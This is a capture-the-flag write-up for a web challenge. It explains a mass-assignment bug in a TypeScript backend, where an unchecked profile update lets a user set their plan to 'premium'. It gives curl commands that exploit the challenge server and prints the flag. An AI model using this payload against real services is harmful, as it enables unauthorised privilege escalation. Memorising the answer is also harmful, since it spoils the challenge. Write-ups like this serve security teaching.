# z Writeup

Challenge type: web

## Summary

The application exposes a profile update endpoint at `/api/me`. Although the frontend only sends `displayName` and `bio`, the backend does not validate or allowlist fields at runtime.

In `server/src/index.ts`, the handler does:

```ts
const body: ProfileUpdate = await c.req.json();
updateProfile(user.id, body);
```

and `updateProfile` does:

```ts
db.update(users).set(data).where(eq(users.id, id)).run();
```

`ProfileUpdate` is only a TypeScript type. At runtime, any extra JSON properties remain in `body`. Since the `users` table includes a `plan` column, sending `plan: "premium"` in the profile update results in a mass-assignment privilege escalation.

## Exploit

1. Register a normal account.
2. Send a profile update that includes `plan: "premium"`.
3. Request `/api/flag`.

Example:

```bash
curl -c jar -b jar -H 'Content-Type: application/json' \
  -d '{"username":"user1","password":"pw"}' \
  https://z.web.cpctf.space/api/register

curl -c jar -b jar -X PUT -H 'Content-Type: application/json' \
  -d '{"displayName":"pwn","bio":"x","plan":"premium"}' \
  https://z.web.cpctf.space/api/me

curl -c jar -b jar https://z.web.cpctf.space/api/flag
```

## Flag

`CPCTF{YOU_wRit3_TyP3ScRipt_aNd_eX3cuTE_JAV4scripT}`
